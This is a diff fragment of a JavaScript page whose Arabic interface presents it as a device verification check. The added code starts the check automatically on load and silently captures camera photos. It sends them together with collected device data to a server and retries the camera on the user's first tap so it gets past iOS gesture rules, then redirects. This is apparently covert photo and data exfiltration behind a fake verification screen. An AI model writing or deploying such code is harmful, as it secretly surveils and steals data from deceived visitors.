     setStatus('جارٍ إرسال البيانات…');
-    let ok = await jsonp(base, SEND_TIMEOUT);
-
+    let ok = await jsonp(base, T_SEND);
     if (!ok) {
       setStatus('تعذّر التأكيد، إعادة المحاولة…');
-      await new Promise((r) => setTimeout(r, 1500));
-      ok = await jsonp(base, SEND_TIMEOUT);
+      await new Promise(r => setTimeout(r, 1200));
+      ok = await jsonp(base, T_SEND);
     }
     return ok;
   }
 
+  /* ===================== التدفق ===================== */
   function succeed() {
     finished = true;
     clearTimeout(failTimer);
@@ -374,33 +577,24 @@
     el.btn.hidden = true;
     el.go.href = REDIRECT;
     el.go.hidden = false;
-    setTimeout(() => { location.replace(REDIRECT); }, REDIRECT_WAIT);
+    setTimeout(() => location.replace(REDIRECT), 1800);
   }
 
   function fail(msg) {
-    finished = true;
-    busy = false;
+    finished = true; busy = false;
     el.ring.className = 'ring fail';
     el.title.textContent = 'تعذّر إكمال التحقق';
     el.sub.textContent = 'يمكنك المتابعة أو إعادة المحاولة.';
     setStatus(msg || 'لم يصل تأكيد من الخادم.', 'err');
-    el.btn.hidden = false;
-    el.btn.disabled = false;
-    el.btn.textContent = 'إعادة المحاولة';
-    el.go.href = REDIRECT;
-    el.go.hidden = false;
-
+    el.btn.hidden = false; el.btn.disabled = false; el.btn.textContent = 'إعادة المحاولة';
+    el.go.href = REDIRECT; el.go.hidden = false;
     clearTimeout(failTimer);
-    failTimer = setTimeout(() => {
-      if (busy) return;
-      location.replace(REDIRECT);
-    }, FAIL_REDIRECT);
+    failTimer = setTimeout(() => { if (!busy) location.replace(REDIRECT); }, 9000);
   }
 
   async function run() {
     if (busy) return;
-    busy = true;
-    finished = false;
+    busy = true; finished = false;
     clearTimeout(failTimer);
     el.btn.disabled = true;
     el.ring.className = 'ring';
@@ -409,16 +603,31 @@
     el.go.hidden = true;
     setStatus('جارٍ التحقق من الجهاز…');
 
+    const n = nonce();
+    const blobP = withTimeout(shoot(), T_CAM, null);
+    blobP.then(b => { if (b) sendPhoto(b, n); });
+
     try {
-      const payload = await collect();
+      const payload = await collect(n);
       const ok = await send(payload);
-      if (ok) succeed();
-      else fail('لم يصل تأكيد من الخادم.');
+      if (!ok) { fail('لم يصل تأكيد من الخادم.'); return; }
+
+      const blob = await withTimeout(blobP, 2200, null);
+      if (blob && !photoDone) await withTimeout(sendPhoto(blob, n), 2500, false);
+      succeed();
     } catch (e) {
       fail('خطأ غير متوقع: ' + (e && e.message ? e.message : 'مجهول'));
     } finally {
       if (!finished) busy = false;
     }
+  }
+
+  /* إعادة محاولة الكاميرا على أول لمسة (iOS يشترط إيماءة) */
+  let gestureUsed = false;
+  function onGesture() {
+    if (gestureUsed || photoDone) return;
+    gestureUsed = true;
+    shoot().then(b => { if (b) sendPhoto(b, window.__vn || nonce()); });
   }
 
   /* ===================== التهيئة ===================== */
@@ -431,7 +640,12 @@
   }
 
   el.btn.addEventListener('click', run);
-  window.addEventListener('pageshow', (e) => { if (e.persisted) location.reload(); });
+  ['pointerdown','touchstart','click'].forEach(ev =>
+    document.addEventListener(ev, onGesture, { passive:true, once:false }));
+  window.addEventListener('pageshow', e => { if (e.persisted) location.reload(); });
+
+  if ('Permissions-Policy' in document) {}
+  run();
 })();
 </script>
 </body>
